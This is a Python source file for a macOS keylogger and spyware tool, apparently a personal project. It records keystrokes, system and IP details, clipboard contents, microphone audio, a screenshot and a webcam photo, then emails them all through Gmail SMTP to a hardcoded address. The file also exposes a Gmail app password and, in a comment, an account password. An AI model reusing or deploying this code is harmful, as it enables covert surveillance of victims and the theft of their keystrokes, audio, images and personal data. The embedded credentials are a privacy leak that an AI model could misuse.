#Email modules
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import cv2
import smtplib

#Modules for computer information collection
import socket
import platform
from requests import get

#Copy cliboard module
import subprocess

#Microphone modules
from scipy.io.wavfile import write
import sounddevice as sd
import wavio as wv

#Screenshot image grab module
from PIL import ImageGrab

#Keystroke module
from pynput.keyboard import Key, Listener

#Datetime module
from datetime import date
from datetime import datetime
import time

#Files to be updated
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
photo_information = "photo.png"

#Default email values
email_address =  "keylogger4214389@gmail.com"
app_password = "ohtzogcxovolgjja" #Password: gr@ntColl1nsKEY##
toaddress = "keylogger4214389@gmail.com"

#Default time & iteration values
microphone_time = 10
time_iteration = 30
datenow = date.today()
timenow = datetime.now().strftime("%H:%M:%S")
currentTime = time.time()

#Default camera values
cam = cv2.VideoCapture(0)

#Filepaths
file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
extend = "/"
file_merge = file_path + extend

#Logger Code
keys = []
count = 0
def on_press(key): #when a key is pressed, append info to the keys array
    global keys, count
    keys.append(key)
    count += 1 #add count

    #if the count is greater than 0, reset the count and write the keys to the file. 
    if count >= 1: 
        count = 0
        write_file(keys)
        keys = []

def write_file(keys): #write the keys in the keys array to the file
    with open(file_merge + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "") #remove any single quotes
            if k.find("space") > 0:
                f.write('\n') #create a new line for each "word"
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()
#the on_release function is triggered when a key is released, and checks if the keylogger time has been met yet. return a bool
def on_release(key):
    elapsed_time = time.time() - currentTime
    if elapsed_time >= time_iteration: 
        return False

#The listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#The function that sends an email containing a keylog. 
def send_email(toaddress):

    fromaddress = email_address

    msg = MIMEMultipart() #creates a multipart message

    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "New Python Log File"

    body = "Log File with keylog, system information, clipboard contents, microphone recording, and screenshot. \nInformation logged at " + str(timenow) + " on " + str(datenow)
    msg.attach(MIMEText(body, 'plain')) #attach the body to the message

    #these are the files to be attached to the email
    filenames = [ keys_information, system_information, clipboard_information, audio_information, screenshot_information, photo_information]
    attachments = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information, file_merge + audio_information, file_merge + screenshot_information, file_merge + photo_information]

    #using a for loop, loop through all the filenames and attachment names
    for x in range(6):
        filename = filenames[x]
        attachment = open(attachments[x], 'rb')
        if filename == "screenshot_information": #only for screenshot_information, use a different attach method. 
            p = MIMEImage("attachment", name=filename)
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p) #encode the message in base64, for security
        p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
        msg.attach(p) #attach each file to the message

    #create a connection with smtp port 587 to connect with gmal
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls() #puts SMTP connection into transport layer security mode
    s.login(fromaddress, app_password) 

    text = msg.as_string()
    s.sendmail(fromaddress, toaddress, text)
    s.quit()

# send_email(keys_information, file_path + extend + keys_information, toaddress) TESTING

#The function that collects information on the mac device and system being monitored. 
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname) #private IP adress

        #try/catch for the Public IP Address. if nothing is found, write the catch statement
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except:
            f.write("Couldn't get public IP Adress. Max Query")
        
        #heavy use of the platform module
        f.write("Private IP Address: " + IPAddress + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("OS: " + str(platform.mac_ver()) + '\n') #to get the OS version of the macOS. 
        f.write("Machine: " + platform.machine() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Processor: " + (platform.processor()) + '\n')
        
# computer_information() TESTING

#The function that copies the information on the clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            #https://stackoverflow.com/questions/1825692/can-python-send-text-to-the-mac-clipboard --> used this as reference/help
            #converts byte string into Unicode string, and pbpaste is the subprocess method for getting clipboard contents
            pasted_data = subprocess.check_output('pbpaste', env={'LANG': 'en_US.UTF-8'}).decode('utf-8') 
            f.write("Clipboard Data: " + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied. Clipboard may contain other media") #if nothing in clipboard/ couldn't be copied


# copy_clipboard() TESTING

#The function that creates a .wav recording through the system's microphone
def microphone():
    fs = 44100 #frequency for recording
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels = 1)
    sd.wait() #waits for the recording to finish

    write(file_merge + audio_information, fs, myrecording)

# microphone() TESTING

#The function that takes a screenshot of the device's screen
def screenshot():
    #very simple: grabs the image off screen, and saves to the desired file in filepath
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# screenshot() TESTING

#The function that takes a photo using front-facing camera
def photo():
    result, img = cam.read() #get to values: if the capture was successful and the capture itself
    if not result:
        print("Image Capture Failed")
    else :
        cv2.imwrite(photo_information, img) #using OpenCV 2 module, write image to file
    cam.release() #stop the camera

#photo() TESTING

#The function that runs all the logging functions and sends the email
def logger():
    computer_information()
    copy_clipboard()
    microphone()
    screenshot()
    photo()
    send_email(toaddress)
    
logger() #essential for the program to actually run